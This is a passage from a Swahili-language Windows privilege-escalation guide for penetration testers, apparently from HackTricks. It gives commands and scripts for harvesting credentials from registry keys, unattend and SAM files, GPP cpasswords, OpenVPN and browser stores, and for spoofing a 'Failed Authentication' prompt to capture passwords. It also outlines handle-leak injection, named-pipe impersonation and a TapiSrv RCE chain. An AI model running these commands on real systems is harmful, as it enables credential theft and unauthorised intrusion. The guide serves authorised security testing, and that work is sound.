plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuration ya forensic management server

Configurations za server za Velociraptor, ambazo mara nyingi huitwa `server.config.yaml`, zinaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye privileges chache anaweza kusoma key hiyo, huenda akaweza kutengeneza API client certificate. Ikiwa hilo litasababisha privileges zaidi hutegemea user roles za server, ufikikaji wa API na identity ambayo server au target agent inaendeshwa nayo. Client configuration huwa na material tofauti; kuipata hakuthibitishi ufikiaji wa server CA. Baadhi ya deployments huhifadhi CA private key nje ya mtandao, kwa hiyo server configuration inayosomeka inaweza pia kukosa signing key.

Kwenye Windows server, kagua ACL ya configuration ya **server** kwenye installation directory yake na nakala zozote za backup zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa kwa service ikiwa ni tofauti. Thibitisha kuwa identity ya sasa inaweza kusoma faili hiyo na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia CA key kutoa client certificate, lakini server-side role inayofaa inahitajika pia; kuunda au kubadilisha role kunaweza kuhitaji datastore write access au restart. Identity ya server yenye privileges zaidi ambayo tayari ipo inaweza kutoa njia ya kufikia lengo hata kama write hizo haziwezekani. API queries zenye haki za execution huendeshwa katika context husika ya server au agent, ambayo inaweza kuwa na privileges nyingi.

Linda server configuration na backups kwa ACLs zenye vizuizi, hifadhi CA signing key nje ya mtandao inapowezekana, na punguza API roles na ufikiaji wa listener. Tazama [nyaraka za Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa security configuration](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni kidhibiti tofauti cha vipindi. Hifadhi yake asilia iliyosimbwa kwa njia fiche inaweza kuwa kwenye `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ilhali nakala rudufu ya vipindi iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) inasema kuwa faili zilizohamishwa husimbwa kwa nenosiri na zinaweza kuwa na vipindi, funguo, scripts, tags na mahusiano; [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) yake inataja hifadhi asilia. Kagua ruhusa za faili na njia zake kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kuwa kitambulisho chochote kilichohifadhiwa bado ni halali au kina ruhusa za juu zaidi.

### Funguo za Host za SSH za Putty

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo za siri za SSH zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa SSH key iliyohifadhiwa. Limehifadhiwa likiwa encrypted lakini linaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha kompyuta, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana kuwa mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikubaini matumizi ya `dpapi.dll` wakati wa uthibitishaji kwa kutumia funguo zisizolingana.

### Faili za unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM na SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka pia zinaweza kuwa na hive za `SAM`, `SECURITY`, na `SYSTEM` za offline. Anza kwa kukagua saraka za backup au image zinazofikika ndani ya mashine, na kagua **majina ya vipengee vilivyomo** kwenye image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hive zimefichuka, na `install.wim`, `boot.wim`, pamoja na image za recovery za kawaida mara nyingi hupotosha. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya wigo. Angalia mwongozo wa Microsoft kuhusu [Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Cached GPP Password

Hapo awali kulikuwa na kipengele kilichowezesha usambazaji wa akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, ziliweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila zilizokuwa ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliokuwa umewekwa wazi, ziliweza kusimbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kutafuta faili za GPP zilizohifadhiwa kwenye kashe za ndani na zilizo na sehemu ya "cpassword" isiyo tupu. Faili kama hiyo ikipatikana, kazi hiyo husimbua nywila na kurudisha object maalum ya PowerShell. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, hivyo kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi kwenye `C:\ProgramData\Microsoft\Group Policy\history` au kwenye _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye taarifa za uthibitishaji:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za chelezo kwenye webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia maudhui inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumika tena. Kagua physical path iliyosanidiwa ya tovuti na kama archive inapatikana kweli kupitia HTTP kabla ya kuichukulia kama ufichuzi. Njia ya kawaida `C:\inetpub\wwwroot` ni eneo la kuanzia tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa bila kufungua archives:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kwamba ina siri au kwamba credential iliyopatikana inatoa ruhusa za juu zaidi.

### Credentials za OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza **kumwomba mtumiaji aweke credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **credentials** ni **hatari**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana kuwa ziliwahi kuwa na **passwords** katika **clear-text** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi `.psafe3`. Ichukulie faili yenye jina linalolingana kama mgombea wa vault iliyosimbwa; uwepo wake hauthibitishi kwamba unaweza kuisoma, kuifungua, au kutumia kitambulisho chochote kilichohifadhiwa humo. Kagua profaili za watumiaji unazoweza kufikia na maeneo ya msingi ya kushiriki faili yaliyosanidiwa unapopitia mahali faili hizo zimehifadhiwa.

Faili ya KeePass `.kdbx` inayosomeka pia ni kidokezo tu cha vault iliyosimbwa. Ili kuifungua, unahitaji nenosiri kuu halisi pamoja na faili yoyote ya ufunguo au vipengele vya akaunti vilivyosanidiwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya heshi ya LM:NT kwenye ingizo, thibitisha akaunti iliyotajwa na kama heshi ya NT ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halipei lenyewe haki za Administrator au SYSTEM; ufikiaji wa huduma ya mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia viwepo. Inventari inapaswa kuripoti njia ya vault na kama inasomeka, bila kuchapisha hifadhidata au vitambulisho vilivyohifadhiwa.

Tafuta katika faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Taarifa za kuingia kwenye Recycle Bin

Kagua vipengee vinavyoweza kufikiwa kwenye Recycle Bin ili kutafuta nakala rudufu na nyaraka za usanidi zilizofutwa, pamoja na faili ambazo majina yake yanataja wazi taarifa za kuingia. Nakala rudufu muhimu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake linalolingana la `$R`; kagua metadata na ruhusa za utambulisho wa sasa za kusoma faili kabla ya kufungua nyaraka. Kile kinachoonekana hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hiyo orodha tupu haithibitishi kuwa hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la nyaraka kama mgombea wa kukaguliwa, si uthibitisho kwamba lina siri halali.

Faili ya `.pfx` iliyofutwa na inayoweza kufikiwa pia inaweza kuwa kiashiria cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kutumika kusaini script ya PowerShell iliyobadilishwa; [PowerShell inahitaji cheti cha code-signing chenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [kanuni za AppLocker za publisher hutathmini utambulisho wa msaini na wigo wa kanuni](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti unahitaji utambulisho wa sasa uweze kurekebisha script husika, kanuni inayotumika ikubali sahihi inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye ruhusa za juu iendeshe script hiyo kwa kweli. Jina la faili la `.pfx`, subject ya cheti, au script inayoweza kuandikwa pekee havithibitishi mnyororo huo. Kagua metadata, ACL, sera na amri ya scheduled task kabla ya kufungua private key au kuanzisha task.

Pia kagua hifadhidata za wasifu za programu za ujumbe zinazoweza kufikiwa, madokezo na faili zilizopokewa ili kutafuta viashiria vya taarifa za kuingia. Export ya urejeshaji wa BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya nakala rudufu yenye jina maalum. Nyenzo hiyo inaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche, yenye nakala rudufu za zamani; kagua volume na nyaraka hizo ikiwa tu una idhini ya kufanya hivyo. Ikiwa nakala rudufu ina `NTDS.dit`, urejeshaji wa taarifa za kuingia za domain nje ya mtandao pia unahitaji hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [mchakato wa nakala rudufu na vikundi vyenye ruhusa za juu](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna key ya urejeshaji inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Key nyingine za registry zinazoweza kuwa na taarifa za kuingia**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Toa funguo za openssh kutoka kwenye registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya vivinjari

Unapaswa kuangalia hifadhidata ambako nywila za **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia angalia historia, alamisho na vipendwa vya vivinjari ili kuona kama huenda nywila zimehifadhiwa humo.

Kwa profile ya kawaida ya Edge ya mtumiaji wa sasa, `Login Data` iko katika `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa katika saraka yake kuu ya `User Data`. [Microsoft inaeleza eneo chaguomsingi la profile](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profile nyingine au sera ya `UserDataDir` inaweza kuihamisha. Uwepo wa faili ni kidokezo tu cha mahali pa kutafuta hifadhi ya credentials: thibitisha kuwa faili zinaweza kusomeka, kuwa una muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine za key zilizoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye ruhusa za juu zaidi. Kuhesabu njia pekee hakuhitaji kufungua hifadhidata au kuchapisha nywila zilizofichuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za profile ni faili za key na login zilizosimbwa zinazohusiana. Uwepo wake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomeka, kama kuna maingizo yaliyohifadhiwa, na kama Primary Password inalinda key kabla ya kuhitimisha kuwa credentials zinaweza kutumika. Ikiwa credential iliyorejeshwa ni ya akaunti ya domain, kagua kando haki za udhibiti wa vikundi zinazotumika kwa akaunti hiyo na haki za kikundi za [kusoma au kusimbua nywila za LAPS](../active-directory-methodology/laps.md); artifacts za kivinjari pekee hazithibitishi njia ya kupata haki za msimamizi.

Zana za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kupitia class ID (CLSID)**, na kila kipengele hutoa utendaji kupitia kiolesura kimoja au zaidi, vinavyotambuliwa kupitia interface IDs (IIDs).

Class na interface za COM hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSID katika registry hii unaweza kupata registry tanzu **InProcServer32**, ambayo ina **thamani chaguomsingi** inayoelekeza kwenye **DLL**, na thamani inayoitwa **ThreadingModel** inayoweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya vivinjari - COM DLL Overwriting: Ndani ya CLSID katika registry hii unaweza kupata registry tanzu InProcServer32, ambayo ina thamani chaguomsingi inayoelekeza kwenye DLL na thamani...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayoendeshwa, unaweza **kupandisha haki** ikiwa DLL hiyo itaendeshwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama njia ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa nywila kwenye faili na registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina maalum**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya funguo na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta manenosiri

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyounda ili **kutekeleza kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na manenosiri yaliyotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa manenosiri kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **majina ya watumiaji** na **manenosiri** ya zana kadhaa zinazohifadhi data hii katika maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) yenye **ufikiaji kamili**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye ruhusa za chini, lakini inayorithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili kwa process yenye ruhusa za chini**, unaweza kupata **handle iliyo wazi ya process yenye ruhusa za juu iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia handles zaidi zilizo wazi za processes na threads zinazorithiwa zikiwa na viwango tofauti vya ruhusa (si ufikiaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, huruhusu processes kuwasiliana na kuhamisha data.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo majukumu hufafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina ruhusa zinazohitajika za **SeImpersonate**. Kutambua **process yenye ruhusa za juu** inayowasiliana kupitia pipe unayoweza kuiga kunatoa fursa ya **kupata ruhusa za juu zaidi** kwa kutumia utambulisho wa process hiyo pindi inapowasiliana na pipe uliyosakinisha. Kwa maelekezo ya kutekeleza shambulio kama hilo, miongozo hii inaweza kusaidia: [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo hukuruhusu **kudaka mawasiliano ya named pipe kwa tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii hukuruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client aliyeidhinishwa kwa mbali anaweza kutumia vibaya njia ya async event inayotumia mailslot ili kugeuza `ClientAttach` kuwa **uandishi wa byte 4** kwenye faili yoyote iliyopo ambayo `NETWORK SERVICE` inaweza kuandika, kisha kupata haki za msimamizi wa Telephony na kupakia DLL yoyote kama huduma. Mtiririko kamili:

- `ClientAttach` ikiwa `pszDomainUser` imewekwa kuwa njia iliyopo inayoweza kuandikwa → huduma huifungua kupitia `CreateFileW(..., OPEN_EXISTING)` na kuitumia kuandika async events.
- Kila event huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima ili kurudia uandishi unaotabirika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiweka njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### File Extensions zinazoweza kutekeleza vitu kwenye Windows

Angalia ukurasa huu **[https://filesec.io/](https://filesec.io/)**

### Matumizi mabaya ya Protocol handler / ShellExecute kupitia Markdown renderers

Viungo vya Markdown vinavyoweza kubofya na kutumwa kwa `ShellExecuteExW` vinaweza kuanzisha URI handlers hatari (`file:`, `ms-appinstaller:` au scheme yoyote iliyosajiliwa) na kutekeleza faili zinazodhibitiwa na mshambulizi kama mtumiaji wa sasa. Tazama:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kufuatilia Command Lines ili kupata passwords**

Unapopata shell kama mtumiaji, kunaweza kuwa na scheduled tasks au processes nyingine zinazoendeshwa ambazo **hupitisha credentials kwenye command line**. Script iliyo hapa chini hunasa command lines za processes kila baada ya sekunde mbili na kulinganisha hali ya sasa na ile ya awali, kisha kutoa tofauti zozote.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Kuiba nywila kutoka kwa michakato

## Kutoka kwa mtumiaji asiye na upendeleo hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa unaweza kufikia kiolesura cha picha (kupitia console au RDP) na UAC imewashwa, katika baadhi ya matoleo ya Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na upendeleo.

